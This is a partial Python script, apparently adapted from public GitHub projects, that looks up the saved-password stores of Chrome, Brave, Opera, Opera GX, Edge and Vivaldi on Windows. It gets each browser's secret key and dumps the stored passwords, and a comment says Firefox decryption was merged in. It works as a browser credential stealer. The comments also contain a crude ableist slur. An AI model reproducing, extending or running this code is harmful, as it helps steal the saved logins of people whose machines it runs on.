#It's not my code, https://github.com/ohyicong/decrypt-chrome-passwords
#I just made it support more browsers than chrome in shitty way
#Also this code has been combined with this code: https://github.com/unode/firefox_decrypt so it can work with most popular browsers
...
def get_passwords(path_local_state, path):
    try:
        ...
        if(1):
            ...
            #(1) Get secret key
            secret_key = get_secret_key(path_local_state)
...
browsers = [["Chrome", "Google\Chrome"], ["Brave", "BraveSoftware\Brave-Browser"], ["Opera", "opera has down syndrome"], ["OperaGX", "why opera, why"], ["Microsoft Edge", "Microsoft\Edge"], ["Vivaldi", "Vivaldi"]]

TEMPLATE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\$here\User Data\Local State"%(os.environ['USERPROFILE']))
TEMPLATE_PATH = os.path.normpath(r"%s\AppData\Local\$here\User Data"%(os.environ['USERPROFILE']))

def print_chromium():
    for x in browsers:
        path_local_state = TEMPLATE_PATH_LOCAL_STATE
        path = TEMPLATE_PATH

        path_local_state = path_local_state.replace("$here", x[1])
        path = path.replace("$here", x[1])

        if x[0] == "Opera":
            path_local_state = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State"%(os.environ['USERPROFILE']))
            path = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable"%(os.environ['USERPROFILE']))
        if x[0] == "OperaGX":
            path_local_state = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera GX Stable\Local State"%(os.environ['USERPROFILE']))
            path = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera GX Stable"%(os.environ['USERPROFILE']))
        if(os.path.exists(path_local_state)):
            print("-----------" + x[0] + "-----------")
            get_passwords(path_local_state, path)

###-------------CHROME AND FIREFOX STOLEN CODE BORDER
